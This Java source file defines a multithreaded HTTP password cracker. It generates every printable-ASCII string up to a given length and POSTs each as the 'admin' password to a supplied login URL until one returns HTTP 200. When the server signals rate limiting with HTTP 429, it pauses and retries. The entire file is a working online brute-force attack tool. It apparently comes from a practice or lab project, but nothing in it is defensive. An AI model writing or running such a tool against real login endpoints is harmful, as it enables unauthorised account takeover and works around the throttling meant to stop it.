package org.example;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.http.HttpStatus;
import org.springframework.web.client.HttpClientErrorException;

import java.net.HttpURLConnection;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.LocalTime;
import java.time.temporal.ChronoUnit;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.LinkedBlockingQueue;

import static org.springframework.http.HttpStatus.TOO_MANY_REQUESTS;

public class BlockingQueueHttpPwCracker implements PwCracker {


    private final HttpClient httpClient;
    private final BlockingQueue<String> queue;

    public int iterations = 0;
    public int connections = 0;

    public BlockingQueueHttpPwCracker() {
        this.httpClient = HttpClient.newHttpClient();
        this.queue = new LinkedBlockingQueue<>();
    }

    private String recursiveCombinationFinder(BlockingQueue<String> queue, int maxLength, int currentLength, byte[] currentPassword) {
        iterations++;
        //System.out.println("Cracker iterations: "+ iterations);
        if (currentLength == maxLength) {
            try {
                queue.put(new String(currentPassword));
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }

            return null;
        }

        for (int i = 33; i < 126; i++) {
            currentPassword[currentLength] = (byte) i;
            String result = recursiveCombinationFinder(queue, maxLength, currentLength + 1, currentPassword);
            if (result != null) {
                return result;
            }
        }

        return null;
    }



    public String crack(int maxLength, String url) {
        int numberOfCores = Runtime.getRuntime().availableProcessors();
        ExecutorService executor = Executors.newFixedThreadPool(numberOfCores - 1);
        System.out.println("Number of cores: " + numberOfCores);

        executor.submit(() -> {
            for (int length = 1; length <= maxLength; length++) {
                byte[] passwordBytes = new byte[length];
                recursiveCombinationFinder(queue, length, 0, passwordBytes);
            }
            return "Not found";
        });

        for (int i = 0; i < numberOfCores; i++) {

            executor.submit(() -> {
                LocalTime start = LocalTime.now();
                ObjectMapper objectMapper = new ObjectMapper();
                String passWordToTry;
                while(true) {
                    passWordToTry = queue.take();
                     boolean success = false;
                     while(!success) {
                    try {
                        HttpRequest request = HttpRequest.newBuilder()
                                .uri(new URI(url))
                                .headers("Content-Type", "application/json;charset=UTF-8")
                                .POST(HttpRequest.BodyPublishers.ofString(objectMapper.writeValueAsString(new User("admin", passWordToTry))))
                                .build();
                        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                        if (response.statusCode() == 200) {
                            System.out.println("Password found: " + passWordToTry);
                            System.out.println("Time: " + start.until(LocalTime.now(), ChronoUnit.SECONDS) + " seconds");
                            System.out.println("Number of variants tested: "+ iterations);
                            executor.shutdownNow();
                            return passWordToTry;
                        }
                         //System.out.println("Connections: " + connections++);

                        if (response.statusCode() == 429) {
                            //System.out.println("Too many requests");
                            Thread.sleep(1000);
                        }
                        if (response.statusCode() == 403)  {
                            success = true;
                        }

                    }
                    catch (Exception e) {
                            throw new RuntimeException(e);
                        }
                    }
                }
            });
        }

        return "Cracking...";
    }
}
